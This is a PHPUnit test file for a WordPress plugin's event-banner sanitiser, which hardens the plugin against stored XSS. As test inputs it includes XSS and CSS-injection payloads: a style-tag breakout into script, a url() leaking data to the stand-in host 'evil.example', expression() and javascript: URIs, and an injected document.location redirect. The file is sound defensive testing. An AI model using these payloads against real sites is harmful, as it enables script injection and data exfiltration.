<?php
/**
 * Tests for event-banner sanitisation (the /banner stored-XSS hardening).
 *
 * Covers the custom CSS sanitiser (exfiltration / breakout / JS-in-CSS) and the
 * position constraint. The HTML path delegates to WP-core wp_kses() with a tight
 * banner allowlist and is exercised by integration tests.
 *
 * @package Peanut_Connect
 */

use PHPUnit\Framework\TestCase;

require_once dirname(__DIR__) . '/includes/class-connect-event-banner.php';

class Test_Banner_Sanitization extends TestCase {

    private function css(string $in): string {
        return Peanut_Connect_Event_Banner::sanitize_banner_css($in);
    }

    public function test_css_blocks_style_tag_breakout(): void {
        $out = $this->css('.b{color:red}</style><script>alert(1)</script>');
        $this->assertStringNotContainsString('<', $out, 'no < may survive (prevents </style> breakout)');
        $this->assertStringNotContainsString('>', $out);
    }

    public function test_css_strips_external_url_exfiltration(): void {
        $out = $this->css('.b{background:url("https://evil.example/leak?c=")}');
        $this->assertStringNotContainsString('evil.example', $out);
        $this->assertStringNotContainsString('url(', $out);
    }

    public function test_css_preserves_inline_data_image_url(): void {
        $out = $this->css('.b{background:url(data:image/png;base64,AAAABBBB)}');
        $this->assertStringContainsString('data:image/png;base64,AAAABBBB', $out);
    }

    public function test_css_strips_import_expression_and_script_uris(): void {
        $out = $this->css('@import url("//evil"); .b{width:expression(alert(1));x:javascript:evil()}');
        $this->assertStringNotContainsStringIgnoringCase('@import', $out);
        $this->assertStringNotContainsStringIgnoringCase('expression(', $out);
        $this->assertStringNotContainsStringIgnoringCase('javascript:', $out);
    }

    public function test_css_strips_moz_binding_and_behavior(): void {
        $out = $this->css('.b{-moz-binding:url(x);behavior:url(evil.htc)}');
        $this->assertStringNotContainsStringIgnoringCase('-moz-binding', $out);
        $this->assertStringNotContainsStringIgnoringCase('behavior:', $out);
    }

    public function test_css_keeps_benign_styling(): void {
        $out = $this->css('.peanut-banner{background:#0a0;color:#fff;padding:12px 20px;font-size:16px}');
        $this->assertStringContainsString('background:#0a0', $out);
        $this->assertStringContainsString('padding:12px 20px', $out);
        $this->assertStringContainsString('font-size:16px', $out);
    }

    public function test_position_is_constrained_to_known_set(): void {
        $m = new ReflectionMethod(Peanut_Connect_Event_Banner::class, 'sanitize_position');
        $m->setAccessible(true);
        $this->assertSame('top', $m->invoke(null, 'top'));
        $this->assertSame('bottom', $m->invoke(null, 'BOTTOM'));
        // Injection attempts collapse to the safe default.
        $this->assertSame('top', $m->invoke(null, "top'); document.location='//evil'; //"));
        $this->assertSame('top', $m->invoke(null, '</script><script>alert(1)</script>'));
        $this->assertSame('top', $m->invoke(null, 12345));
    }
}
